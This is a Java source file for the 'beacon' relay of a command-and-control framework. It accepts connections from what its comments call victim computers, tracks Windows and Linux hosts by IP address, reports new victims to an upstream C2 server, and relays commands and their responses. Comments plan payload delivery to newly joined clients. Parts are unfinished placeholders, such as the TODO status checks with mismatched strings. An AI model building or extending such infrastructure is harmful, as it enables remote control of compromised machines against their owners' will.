package Servers.Beacon;

import java.util.Scanner;
import Servers.Duplexer;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.security.MessageDigest;
import java.nio.charset.StandardCharsets;

public class BeaconServer implements Runnable{
    // Dictionaries to Map IP's to Client responses
    private HashMap<String,ArrayList<String>> windowsClientResponses;
    private HashMap<String,ArrayList<String>> linuxClientResponses;

    // Dictionary to Map IP's to Objects that handle them
    private HashMap<String,BeaconClientHandler> windowsClientObjects;
    private HashMap<String,BeaconClientHandler> linuxClientObjects;
    

    // Pointer to the Thread responsible for interacting with the C2 Server
    private BeaconC2Handler C2Handler;

    // Socket that is listentning for connections from clients (victim computers)
    private ServerSocket serverSocket;

    /**
     * This Creates a new Beacon Server. The Server will listen for new victims, and communicate 
     * back to the C2 Server.
     * 
     * @param C2ServerIPAddress IP Address of the C2 Server
     * @param passwordDigest SHA-256 Digest of the Password entered by the user setting up this Beacon
     * @throws IOException
     */
    public BeaconServer(String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.windowsClientResponses = new HashMap<>();
        this.linuxClientResponses = new HashMap<>();
        this.windowsClientObjects = new HashMap<>();
        this.linuxClientObjects = new HashMap<>();

        this.C2Handler = new BeaconC2Handler(this, C2ServerIPAddress, passwordDigest);
        this.serverSocket = new ServerSocket(80);
    }

    /**
     * This function is used to shut down the Beacon Server. 
     * The Beacon server will distribute this message accordingly, to ensure that all
     * connections are shut down gracefully
     * 
     * @param reason
     * @throws IOException
     */
    protected void quit(String reason) throws IOException{
        synchronized(windowsClientObjects){
            for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
                clientHandler.quit(reason);
            }
        }
        synchronized(linuxClientObjects){
            for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                clientHandler.quit(reason);
            }
        }
        serverSocket.close();
        System.out.println("Beacon Server is shutting down. Reason: " + reason);
    }

    /**
     * Add Responses from commands run on the C2 Victims to an ArrayList containing all of their responses
     * 
     * @param IPAddress the IP Address of the Client that the response came from
     * @param Response The Response sent from the client
     */
    protected void addDataToResponsesDictionaries(String IPAddress, String Response){
        synchronized(windowsClientResponses){
            synchronized(linuxClientResponses){
                if(windowsClientResponses.keySet().contains(IPAddress)){
                    windowsClientResponses.get(IPAddress).add(Response);
                } else {
                    linuxClientResponses.get(IPAddress).add(Response);
                }
            }
        }
    }

    /**
     * Get all responses to C2 Commands from an individual client
     * 
     * @param IPAddress IP Address of the client that the C2 requests the responses to.
     * @return ArrayList of all of the responses from the desired client
     */
    protected ArrayList<String> getSingleClientResponses(String IPAddress){
        synchronized(windowsClientResponses){
            synchronized(linuxClientResponses){
                if(windowsClientResponses.keySet().contains(IPAddress)){
                    return windowsClientResponses.get(IPAddress);
                } else {
                    return linuxClientResponses.get(IPAddress);
                }
            }
        }
    }

    /**
     * Get Responses to C2 Commands from All clients of a particular Operating System
     * 
     * @param OS "Windows" or "Linux"
     * @return HashMap of all Responses. Keys are the IP Addresses that the Responses come from,
     * and the Value is an ArrayList of all of the responses to commands sent by the C2
     */
    protected HashMap<String, ArrayList<String>> getMultipleClientResponses(String OS){
        if(OS.equals("Windows")){
            synchronized(windowsClientResponses){
                return windowsClientResponses;
            }
        }else{
            synchronized(linuxClientResponses){
                return linuxClientResponses;
            }
        }
    }

    /**
     * This function will provide the Status (Can the C2 Server still run commands on the victims) 
     * of Clients that this Beacon Server is responsible for based on the Scope Parameter
     * 
     * @param Scope Either "All", "Windows", "Linux", or the IP Address (x.x.x.x) of the Computer of whose status is desired
     * @return Returns A HashMap, With All of the Keys as IP Addresses, and the Value True or False. True if the client can
     * communicate with the Beacon, False if the client cannot communicate with the Beacon
     */
    protected HashMap<String, Boolean> getClientStatus(String Scope){
        // Create a HashMap, to store Key/Value pairs in the form of IP's, and True/False.
        // True if the client is still active, false if the client is no longer active.
        HashMap<String, Boolean> clientStatus = new HashMap<>();

        // Send Status messages based on the Scope of the request
        if(Scope.equals("Windows") || Scope.equals("All")){
            synchronized(windowsClientObjects){
                for(BeaconClientHandler clientHandler : windowsClientObjects.values()){
                    clientHandler.sendToClient("TODO: Figure out how we want to check the status of a client");
                }
            }
        }
        if(Scope.equals("Linux") || Scope.equals("All")){
            synchronized(linuxClientObjects){
                for(BeaconClientHandler clientHandler : linuxClientObjects.values()){
                    clientHandler.sendToClient("TODO: Figure out how we want to check the status of a client");
                }
            }
        }
        // If the Scope contains a . (i.e. the Scope is an IP Address)
        if(Scope.contains(".")){
            synchronized(windowsClientObjects){
                synchronized(linuxClientObjects){
                    if(windowsClientObjects.keySet().contains(Scope)){
                        windowsClientObjects.get(Scope).sendToClient("TODO: Figure out how we want to check the status of a client");
                    } else if(linuxClientObjects.keySet().contains(Scope)){
                        linuxClientObjects.get(Scope).sendToClient("TODO: Figure out how we want to check the status of a client");
                    }
                }
            }
        }
        

        // Wait 15 seconds to give all of the clients time to respond.
        try{
            wait(15000);
        }catch(InterruptedException e){
            e.printStackTrace();
        }
        

        // Check status' of clients based on the scope of the request
        if(Scope.equals("Windows") || Scope.equals("All")){
            synchronized(windowsClientResponses){
                for(String client: windowsClientResponses.keySet()){
                    if(windowsClientResponses.get(client).contains("TODO Figure out how we want to check the status of a client")){
                        clientStatus.put(client, true);
                        windowsClientResponses.get(client).remove("TODO Figure out how we want to check the status of a client");
                    } else {
                        clientStatus.put(client, false);
                    }
                }
            }
        }
        if(Scope.equals("Linux") || Scope.equals("All")){
            synchronized(linuxClientResponses){
                for(String client: linuxClientResponses.keySet()){
                    if(linuxClientResponses.get(client).contains("TODO Figure out how we want to check the status of a client")){
                        clientStatus.put(client, true);
                        linuxClientResponses.get(client).remove("TODO Figure out how we want to check the status of a client");
                    } else {
                        clientStatus.put(client, false);
                    }
                }
            }
        }
        // If the Scope contains a . (i.e. the Scope is an IP Address)
        if(Scope.contains(".")){
            synchronized(windowsClientResponses){
                synchronized(linuxClientResponses){
                    if(windowsClientResponses.keySet().contains(Scope)){
                        if(windowsClientResponses.get(Scope).contains("TODO Figure out how we want to check the status of a client")){
                            clientStatus.put(Scope, true);
                            windowsClientResponses.get(Scope).remove("TODO Figure out how we want to check the status of a client");
                        } else {
                            clientStatus.put(Scope, false);
                        }
                    } else if(linuxClientResponses.keySet().contains(Scope)){
                        if(linuxClientResponses.get(Scope).contains("TODO Figure out how we want to check the status of a client")){
                            clientStatus.put(Scope, true);
                            linuxClientResponses.get(Scope).remove("TODO Figure out how we want to check the status of a client");
                        } else {
                            clientStatus.put(Scope, false);
                        }
                    }
                }
            }
        }

        return clientStatus;
    }

    @Override
    public void run(){
        // Start the thread that interacts with the C2 Server
        Thread C2HandlerThread = new Thread(C2Handler);
        C2HandlerThread.start();
        // Always listening for clients
        while(true){
            try{
                // Accept new client
                Socket socket = serverSocket.accept();
                Duplexer duplexer = new Duplexer(socket);

                // Get clients IP Address
                // getRemoteSocketAddress retruns in the form /IPAddress:Port (i.e. /1.2.3.4:12345)
                // We just care about the IP Address though
                String unformattedIPAddress = socket.getRemoteSocketAddress().toString();
                String IPAddress = unformattedIPAddress.split(":")[0].substring(1);
                String OSMessage = duplexer.receive();

                // Send message to C2 announcing that a new client has been obtained
                C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);

                // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
                BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this);
                Thread clientHandlerThread = new Thread(clientHandler);
                clientHandlerThread.start();

                // Add to client lists
                if(OSMessage.equals("Windows")){
                    windowsClientObjects.put(IPAddress,clientHandler);
                    windowsClientResponses.put(IPAddress, new ArrayList<String>());
                    // TODO: Send Payload back on the client's initial join
                }else if(OSMessage.equals("Linux")){
                    linuxClientObjects.put(IPAddress,clientHandler);
                    linuxClientResponses.put(IPAddress, new ArrayList<String>());
                    // TODO: Send Payload back on the client's initial join
                }
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }

    public static void main(String[] args){
        // Have the user enter in the IP Address to connect to
        Scanner userScanner = new Scanner(System.in);
        System.out.print("Enter C2 Server IP Address: ");
        String C2ServerIPAddress = userScanner.next();
        // Have the user enter in the password
        System.out.print("Enter Password: ");
        String password = userScanner.next();
        // Hash the Password
        String passwordDigest = "";
        try{
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] encodedhash = digest.digest(password.getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder(2 * encodedhash.length);
            for (int i = 0; i < encodedhash.length; i++) {
                String hex = Integer.toHexString(0xff & encodedhash[i]);
                if(hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }
            passwordDigest = hexString.toString();
        } catch(Exception e){}
        
        try{
            BeaconServer beaconServer = new BeaconServer(C2ServerIPAddress, passwordDigest);
            beaconServer.run();
        } catch(IOException e){
            e.printStackTrace();
        }
        
        userScanner.close();
    }
}
